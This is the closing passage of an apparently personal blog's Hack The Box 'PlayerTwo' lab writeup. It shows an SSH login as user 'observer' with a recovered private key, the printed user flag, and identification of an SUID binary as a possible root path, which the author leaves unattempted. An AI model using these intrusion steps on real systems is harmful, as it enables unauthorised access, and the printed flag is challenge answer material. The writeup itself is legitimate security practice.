</pre></table></code></div></div><p>Success! I was able to use the SSH private key to log in as the user <code class="language-plaintext highlighter-rouge">observer</code>. While logging in I did notice a strange error <code class="language-plaintext highlighter-rouge">load pubkey "observer_id_rsa": invalid format</code> but it didn’t seem to cause any problems.</p><h3 id="usertxt">User.txt</h3><p>First order of business…claim my hard-earned user flag!</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>observer@player2:~$ cat user.txt 
b1aade7c541ab9a9cc82f34aaf61bcfa
</pre></table></code></div></div><p><em>Yes, I know the real flag is in uppercase .</em></p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user-observer">Enumeration as User <code class="language-plaintext highlighter-rouge">observer</code></h3><p>While logging in, I noticed the MOTD stated <code class="language-plaintext highlighter-rouge">121 packages out of date, 5 security updates</code>. I’m sure that at least 124 of those were rabbit holes so I didn’t pay too much attention to it, and proceeded to enumerate the machine more deeply.</p><p>While looking through the files that had the SUID bit set, I noticed that <code class="language-plaintext highlighter-rouge">/opt/Configuration_Utility/Protobs</code>stood out.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>observer@player2:~$ cd /opt/Configuration_Utility/
observer@player2:/opt/Configuration_Utility$ ls
ld-2.29.so  libc.so.6  Protobs
observer@player2:/opt/Configuration_Utility$ file Protobs 
Protobs: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/Con, for GNU/Linux 3.2.0, BuildID[sha1]=53892814b4e50f2f75dd5fa98b077741917688a2, stripped
</pre></table></code></div></div><p>It looked like I had found the configuration utility for the <code class="language-plaintext highlighter-rouge">protobs</code> program, which has the <code class="language-plaintext highlighter-rouge">setuid</code> bit set. This looks like something that could possibly be used to do my privilege escalation. The two <code class="language-plaintext highlighter-rouge">.so</code> files look like clues as to how the file is built, though unfortunately I am quite weak on C programming and with reverse engineering and binary exploitation, so this may be a bit beyond me for now. I will return to this one at a later date after I learn more.</p><h3 id="roottxt">Root.txt</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-nope.png" alt="Nope." /></p><p>Thanks to <a href="https://www.hackthebox.eu/home/users/profile/13531"><code class="language-plaintext highlighter-rouge">MrR3boot</code></a> &amp; <a href="https://www.hackthebox.eu/home/users/profile/&lt;profile_num&gt;"><code class="language-plaintext highlighter-rouge">b14ckh34rt</code></a> for creating such a fun and challenging machine. I feel like I had to learn as much just to get User access for this one as I normally would in three or four easy - medium ones all together.</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/cewl/" class="post-tag no-text-decoration" >cewl</a> <a href="/tags/twirp/" class="post-tag no-text-decoration" >twirp</a> <a href="/tags/rpc/" class="post-tag no-text-decoration" >rpc</a> <a href="/tags/2fa/" class="post-tag no-text-decoration" >2fa</a> <a href="/tags/totp/" class="post-tag no-text-decoration" >totp</a> <a href="/tags/burp/" class="post-tag no-text-decoration" >burp</a> <a href="/tags/binary-analysis/" class="post-tag no-text-decoration" >binary analysis</a> <a href="/tags/c/" class="post-tag no-text-decoration" >c</a> <a href="/tags/sql/" class="post-tag no-text-decoration" >sql</a> <a href="/tags/mosquitto/" class="post-tag no-text-decoration" >mosquitto</a> <a href="/tags/mqtt/" class="post-tag no-text-decoration" >mqtt</a> <a href="/tags/insane/" class="post-tag no-text-decoration" >insane</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/mrr3boot/" class="post-tag no-text-decoration" >mrr3boot</a> <a href="/tags/b14ckh34rt/" class="post-tag no-text-decoration" >b14ckh34rt</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - PlayerTwo Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/playertwo/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - PlayerTwo Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/playertwo/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - PlayerTwo Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/playertwo/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/forwardslash/"><div class="card-body"> <span class="timeago small" > Jun 6, 2020 <i class="unloaded">2020-06-06T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Forwardslash Writeup</h3><div class="text-muted small"><p> HTB - ForwardSlash Overview Useful Skills and Tools Enumeration Nmap scan I started my enumeration with an nmap scan of 10.10.10.183. The options I regularly use are: Flag ...</p></div></div></a></div><div class="card"> <a href="/posts/oouch/"><div class="card-body"> <span class="timeago small" > Jun 11, 2020 <i class="unloaded">2020-06-11T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Oouch Writeup</h3><div class="text-muted small"><p> HTB - Oouch Overview This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2. Persistence a...</p></div></div></a></div><div class="card"> <a href="/posts/admirer/"><div class="card-body"> <span class="timeago small" > Aug 6, 2020 <i class="unloaded">2020-08-06T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Admirer Writeup</h3><div class="text-muted small"><p> HTB - Admirer Overview An easy difficulty Linux machine that has an interesting take on database manipulation to obtain a local file inclusion vulnerability. It also has an interesting new (to...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/traceback/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Traceback Writeup</p></a> <a href="/posts/remote/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Remote Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
